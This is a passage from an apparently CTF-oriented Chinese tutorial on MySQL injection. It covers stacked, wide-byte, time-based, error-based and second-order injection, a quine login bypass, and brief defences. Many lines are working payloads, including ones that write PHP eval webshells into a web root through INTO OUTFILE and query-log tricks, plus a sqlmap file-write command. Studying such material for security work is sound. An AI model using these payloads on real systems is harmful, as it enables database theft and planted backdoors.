<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comment<span class="operator">=</span><span class="number">123</span><span class="string">&#x27;/*&amp;name=*/,(select database()),&#x27;</span>micgo<span class="string">&#x27;)%23 &amp; user=123</span></span><br></pre></td></tr></table></figure>





<h5 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h5><p>update语句的格式一般为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update &lt;table_name&gt; set column = where &lt;条件&gt;</span><br></pre></td></tr></table></figure>



<h5 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h5><p>delete语句一般为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from &lt;table_name&gt; where &lt;条件&gt;</span><br></pre></td></tr></table></figure>

<p>原理还是和上面一样，只是这个要注意一下不要把数据库里面的内容删了，所以一定要保持最后逻辑表达式的结果为假。or连接词慎用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and sleep(3) 结果为假</span><br><span class="line">1 and updatexml(1,(select concat(’~’,user())),1) 报错最终结果为假</span><br></pre></td></tr></table></figure>



<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="newstart-multiSQL"><a href="#newstart-multiSQL" class="headerlink" title="newstart multiSQL"></a>newstart multiSQL</h5><p>根据题目翻译考的是堆叠注入，试了一下果然可以，题目要求把火华师傅的四级成绩改到425分以上，发现<code>union,select,update,insert</code> 都被过滤了，这里我们可以利用<code>replace into</code> (替换插入) 进行数据修改,再利用<code>delete</code>删除原数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST: </span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;show tables;#查数据库里所有的表</span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;desc score;#查score表中所有字段</span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;replace into score values(&quot;火华&quot;,200,200,200);#表中插入一条数据</span><br><span class="line">username=%E7%81%AB%E5%8D%8E&#x27;;delete from score where listen=11;#删除原本的数据</span><br></pre></td></tr></table></figure>

<p>操作完以后，点击验证数据就可以拿到flag，复现的时候注意中文符号以及不要重复多次执行sql语句，有可能有奇奇怪怪的错误。</p>
<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>宽字节概念<br>  单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)。<br>  多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</p>
<p>  宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字。</p>
<p><strong>函数addslashes()</strong><br>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符：单引号（’），双引号（”），反斜杠（\）</p>
<p>替换反斜杠，反斜杠的GBK编码为%5C，根据GBK编码在前面加上%DE，%DF，%E0等都可以组成一个汉字，从而把反斜杠给吃掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Payload：?id=%E0&#x27; or sleep(3)%23</span><br></pre></td></tr></table></figure>







<h4 id="延时注入总结"><a href="#延时注入总结" class="headerlink" title="延时注入总结"></a>延时注入总结</h4><h5 id="逐字注入"><a href="#逐字注入" class="headerlink" title="逐字注入"></a>逐字注入</h5><p>能够截取字符串，同时能触发延时即可！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Select *from table Where id =1 and (if(substr(database(),1,1)=&#x27;u&#x27;, sleep(3), null));</span><br><span class="line">Select * from table where id= 1 and (if(ascii(substr(database(),1,1))=100, sleep(3), null));</span><br></pre></td></tr></table></figure>

<h5 id="BENCHMARK"><a href="#BENCHMARK" class="headerlink" title="BENCHMARK"></a>BENCHMARK</h5><p>除了sleep之外的时间延时注入，还有：BENCHMARK(count,expr)</p>
<p>BENCHMARK()函数重复 count次执行表达式expr。它可以被用于计算 MYSQL处理表达式的速度。结果值通常为0。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(100000000,sha(1));</span><br><span class="line">Select * from table where id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));</span><br></pre></td></tr></table></figure>

<h5 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from user A,user B;</span><br><span class="line">SELECT count (*) FROM information_schema.columns A,information_schema.columns B,information_schema.tables C;</span><br></pre></td></tr></table></figure>

<h5 id="GET-LOCK"><a href="#GET-LOCK" class="headerlink" title="GET_LOCK"></a>GET_LOCK</h5><p>除了sleep之外的时间延时注入，还有：GET_LOCK(str,timeout)</p>
<p>函数使用说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select GET_LOCK(&#x27;a&#x27;,10)</span><br></pre></td></tr></table></figure>

<p>注意：设置锁后，需要新开 一 个窗口并且是长连接才会有效。</p>
<h5 id="RLIKE"><a href="#RLIKE" class="headerlink" title="RLIKE"></a>RLIKE</h5><p>除了sleep之外的时间延时注入，还有RLKE。</p>
<p>通过 rpad 或 repeat 构造长字符串，加以计算量大的 pattern，通过repeats的参数可以控制延时长短。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select concat (rpad (1,999999,a),rpad (1,999999,a),rpad(1,999999,a) ,rpad(1,999999,a) </span><br><span class="line">,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a) </span><br><span class="line">,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rp</span><br><span class="line">ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE &#x27;(a.*)+(a.*)+</span><br><span class="line">(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;;</span><br></pre></td></tr></table></figure>



<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入条件:  后台没有屏蔽数据库报错信息，在语法发生错误的时候会输出在前端</p>
<p>常用四个报错函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">updatexml()    xpath报错注入  updatexml(1,concat(0x7e,database()),0)</span><br><span class="line">extractvalue() xpath报错注入  extracrvalue(0,concat(0x7e,database()))</span><br><span class="line">floor()        取整函数</span><br><span class="line">exp()          函数返回e指数X的幂值,当传递大于709的值时,会引起溢出错误  exp(~(select * from(select user())a))</span><br><span class="line">geometrycollection() multipoint() polygon() multipolygon() linestring() multilinestring() 几何函数报错注入</span><br></pre></td></tr></table></figure>

<p>floor()   mysql的一个取整函数</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union <span class="keyword">select</span> <span class="built_in">count</span>(*),concat(<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure>

<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322134455656.png" alt="image-20230322134455656"></p>
<p>分析：</p>
<p>rand()函数可以产生一个在0和1之间的随机数</p>
<p> <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322111730857.png" alt="image-20230322111730857"></p>
<p> <img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322111738048.png" alt="image-20230322111738048"></p>
<p>但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，称之为伪随机</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1838324-20200430005415464-2095664437.png" alt="img" style="zoom: 80%;" />
floor函数的作用就是返回小于等于括号内该值的最大整数，rand()本身是返回0~1的随机数，但在后面*2就变成了返回0~2之间的随机数，配合上floor函数就可以产生确定的两个数，即0和1，并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值
此处的czs表为含有四行数据的表，结合上述的函数，每次产生的随机数列都是 0 1 1 0
![img](https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1838324-20200430013827951-1006107102.png)

<p>综合使用产生报错select count(*),floor(rand(0)*2)x from czs group by x;</p>
<p>当count(*)和group by x同时执行时，就会爆出duplicate entry错误, 通过 floor 报错的方法来爆数据的本质是 group by 语句的报错</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322133316186.png" alt="image-20230322133316186" style="zoom:67%;" />



<p>mysql报错注入修复方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 屏蔽能造成报错注入的各种函数</span><br><span class="line">2. 对输入长度做限制，对用户输入做预处理</span><br><span class="line">3. 对各种报错注入的返回结果，统一返回至不包含任何错误提示信息的回显页面</span><br><span class="line">4.使用数据库防火墙，精准分析业务SQL和危险SQL，拦截SQL注入等危险语句</span><br></pre></td></tr></table></figure>





<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>在输入的时候进行了处理，但是在取出数据的时候没有进行检验</p>
<p><strong>用户名和密码分开检验</strong></p>
<p>也就是说它是先检验username，把username对应的所有字段都查出来后，再检验密码能不能和查出来的密码对上，检验密码的过程可能会有一个md5的加密</p>
<p>登录验证的流程已经说清楚了，先做一个小测试</p>
<p>如果执行一个查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = 0 union select 1,&#x27;admin&#x27;,md5(&#x27;abc&#x27;); </span><br></pre></td></tr></table></figure>

<p>则会返回以下结果：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/20163356-f177be36d62355a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790/format/webp" alt="img"></p>
<p>这样的话思路就很清晰了，我们先在用户名处输入<code>1&#39; union select 1,&#39;admin&#39;,&#39;900150983cd24fb0d6963f7d28e17f72&#39;#</code>，得到的是上图的结果。密码处我们再输入一个上图密码md5加密之前的密码也就是abc 即可绕过检验，成功登陆admin账户</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span><span class="number">900150983</span>cd24fb0d6963f7d28e17f72<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">password = abc</span></span><br></pre></td></tr></table></figure>



<h4 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h4><h5 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h5><p>条件：</p>
<blockquote>
<p>1、知道web绝对路径</p>
<p>2、有文件写入权限(一般情况只有root用户有)</p>
<p>3、数据库开启了<code>secure_file_priv</code>设置</p>
</blockquote>
<p>secure_file_priv    查询语句：<code>show global variables like &quot;secure%&quot;; </code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NULL   禁止限制操作 </span><br><span class="line">C:\    值为某一目录，则只能操作该目录下的文件 </span><br><span class="line">&#x27;&#x27;     为空，则表示不对读写文件进行限制，即可以写入任意磁盘文件(区分NULL)  </span><br></pre></td></tr></table></figure>

<p>secure_file_priv只能通过设置my.ini来配置，不能通过SQL语言来修改，因为它是只读变量</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322183051771.png" alt="image-20230322183051771" style="zoom:45%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322135516187.png" alt="image-20230322135516187" style="zoom:67%;" />

<p>然后就能用<code>select into outfile</code>写入<code>webshell</code></p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322140000635.png" alt="image-20230322140000635" style="zoom:50%;" />

<p>常见手法：</p>
<p>联合注入写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]);?&gt;&quot;,3 into outfile &#x27;</span><span class="attr">C</span>:\\phpstudy\\<span class="variable constant_">WWW</span>\\sqli\\shell.<span class="property">php</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>

<p><code>dumpfile</code>函数写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,&quot;&lt;?php @eval($_POST[&#x27;</span>shell<span class="string">&#x27;]);?&gt;&quot;,3 into dumpfile &#x27;</span><span class="attr">C</span>:\\phpstudy\\<span class="variable constant_">WWW</span>\\sqli\\shell.<span class="property">php</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>

<p>lines terminated by 写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> lines terminated by <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//lines terminated by 可以理解为以每行终止的位置添加xx内容</span></span><br></pre></td></tr></table></figure>

<p>lines starting by 写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> lines starting by <span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用 lines starting by 语句拼接webshell的内容。lines starting by可以理解为以每行开始的位置添加xx内容</span></span><br></pre></td></tr></table></figure>

<p>fields terminated by 写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/work/shell.php&#x27;</span> fields terminated by <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用fields terminated by语句拼接webshell的内容  fields terminated by可以理解为以每个字段的位置添加xx内容</span></span><br></pre></td></tr></table></figure>

<p>columns terminated by 写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> into outfile <span class="string">&#x27;C:/wamp64/www/shell.php&#x27;</span> <span class="variable constant_">COLUMNS</span> terminated by <span class="string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//利用fields terminated by语句拼接webshell的内容 columns terminated by 可以理解为以每个字段的位置添加xx内容</span></span><br></pre></td></tr></table></figure>

<p>sqlmap写入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">写入到 /tmp 目录下 (要写的文件，必须在kali本机里有)</span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;user-info-php-submit-button=View+Account+Details&quot;</span> -p <span class="string">&#x27;username&#x27;</span>  --file-write=<span class="string">&quot;shell.php&quot;</span>  --file-dest=<span class="string">&quot;/tmp/shell.php&quot;</span></span><br></pre></td></tr></table></figure>

<p>读文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;文件名&#x27;)；</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322141028688.png" alt="image-20230322141028688" style="zoom:67%;" />



<h5 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h5><p>MySQL的两个全局变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">general_log      日志保存状态，一共有两个值（ON/OFF）</span><br><span class="line">general_log_file 日志的保存路径</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322161018141.png" alt="image-20230322161018141" style="zoom: 67%;" />

<p>如果目前这个<code>general_log</code>为off状态，那么日志就没有被记录进去，所以要先打开这个全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br></pre></td></tr></table></figure>

<p>打开过后，不管sql语句是否正确，日志文件中都会记录我们写的sql语句</p>
<p>接下来修改<code>general_log_file</code>，可以直接通过SQL语句修改，并且必须修改为如<code>.php</code>后缀的文件，不然马不能被解析</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy\\phpstudy_pro\\Extensions\\MySQL5.7.26\\log.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322180312855.png" alt="image-20230322180312855" style="zoom: 50%;" />

<p><code>接下来使用 select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;;</code> 查询语句，其实就是写马，让日志文件众留下这样一句查询语句</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322180736193.png" alt="image-20230322180736193"></p>
<p>但是最后也要考虑能不能成功的连接到马，像如果<code>secure_file_priv</code>固定为C:\，而网站是搭在D盘上，那把<code>general_log_file</code>修改为C盘下的文件也连接不到，除非还有文件包含漏洞等</p>
<p>这里还得修改日志文件log.php的路径，让他在网站目录下才能成功连接</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322182458681.png" alt="image-20230322182458681" style="zoom: 67%;" />

<p>成功连接</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322182442934.png" alt="image-20230322182442934" style="zoom: 50%;" />

<h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p>条件比较苛刻</p>
<p>（1）union注入在这里行不通。要日志写马能够连接必须要修改<code>general_log_file</code>为比如<code>php</code>后缀的文件，不然马不能被解析，所以必须要先用到<code>set global general_log_file=&#39;xx.php&#39;;</code>，那么union注入就没机会了，union基本都是<code>?id=1 union select 1,2,select &#39;&#39;;</code>这样，不能执行<code>set</code>的</p>
<p>（2）有堆叠注入，要先<code>?id=1;set global general_log_file=&#39;xx.php&#39;;</code>，然后直接执行<code>?id=1;select &#39;木马&#39;;</code></p>
<p>不过要想有堆叠注入的条件，源码中必须要用到<code>mysqli_multi_query()</code>。一般后台查询数据库使用的语句都是用<code>mysql_query()</code>，所以堆叠注入在mysql上不常见。</p>
<p>（3）再者就是成功登录到别人的数据库里了，先<code>set global general_log_file=&#39;xx.php&#39;;</code>，然后直接执行<code>select &#39;木马&#39;;</code></p>
<p>（4）没有对 <code>&#39; </code>和 <code>&quot;</code> 进行过滤，因为outfile后面的物理路径必须要有引号</p>
<h5 id="慢查询日志写shell"><a href="#慢查询日志写shell" class="headerlink" title="慢查询日志写shell"></a>慢查询日志写shell</h5><p>MySQL日志主要包含: 错误日志、查询日志、慢查询日志、事务日志。在 5.6.34版本以后secure_file_priv的值默认为NULL</p>
<p>MySQL的慢查询日志是MySQL提供的一种日志记录，它用来记录在MySQL中响应时间超过阀值的语句，long_query_time的默认值为10，意思是运行10S以上的语句。运行时间超过long_query_time值的SQL会被记录到慢查询日志中。使用慢查询主要针对日志量庞大，通过日志文件getshell出现问题的情况</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%slow%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy\\phpstudy_pro\\WWW\\slow.php&#x27;</span>; 日志路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;   启用慢查询日志</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> log_queries_not_using_indexes<span class="operator">=</span><span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322194438585.png" alt="image-20230322194438585" style="zoom: 67%;" />

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL slow_query_log_file=&#x27;C:\\phpstudy\\phpstudy_pro\\WWW\\slow.php&#x27;;   //原理同上</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27; or sleep(10);</span><br></pre></td></tr></table></figure>

<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322193527824.png" alt="image-20230322193527824"></p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230322193550168.png" alt="image-20230322193550168"></p>
<p>若对敏感字符进行过滤，可以采用字符串拼接(concat) 字符串替换(replace)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file =CONCAT(&quot;/var/www/html/shell.p&quot;,&quot;hp&quot;); </span><br><span class="line">set global general_log_file =REPLACE(&quot;/var/www/html/shell.jpg&quot;,&quot;jpg&quot;,&quot;php&quot;); </span><br></pre></td></tr></table></figure>





<h4 id="quine注入"><a href="#quine注入" class="headerlink" title="quine注入"></a>quine注入</h4><p><code>Quine</code>又叫做自产生程序，在<code>sql</code>注入技术中，这是一种使得输入的<code>sql</code>语句和输出的<code>sql</code>语句一致的技术，常用于一些特殊的登陆绕过<code>sql</code>注入中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//官方payload</span><br><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)</span><br></pre></td></tr></table></figure>



<h4 id="防御注入"><a href="#防御注入" class="headerlink" title="防御注入"></a>防御注入</h4><p>预编译和参数绑定</p>
<p>转义单引号，统一php和Mysql的字符集</p>
<p>过滤敏感字符</p>
<h5 id="第三届第五空间yet-another-mysql-injection"><a href="#第三届第五空间yet-another-mysql-injection" class="headerlink" title="第三届第五空间yet_another_mysql_injection"></a>第三届第五空间<code>yet_another_mysql_injection</code></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面<code>php</code>代码逻辑实现了一个通过<code>POST</code>提交登录请求的方法，要求<code>username</code>必须为<code>admin</code>，密码需要与查询到的<code>password</code>一致，才能拿到<code>flag</code>。</p>
<p>其实如果直接看这道题其实给出了所使用的<code>sql</code>语句，在语句中给出了表<code>user</code>，包括黑名单也在<code>checkSql</code>中都已经给出了，那么按理看这不是一个困难的注入，可以当成一个简单的盲注。通过使用<code>like</code>替换<code>=</code>，<code>benchmark</code>（或者其他笛卡儿积等）替换<code>sleep</code>，<code>mid</code>替换<code>substr</code>，<code>/**/</code>替换<code>Space</code>，使用如下<code>paload</code>即可完成：</p>
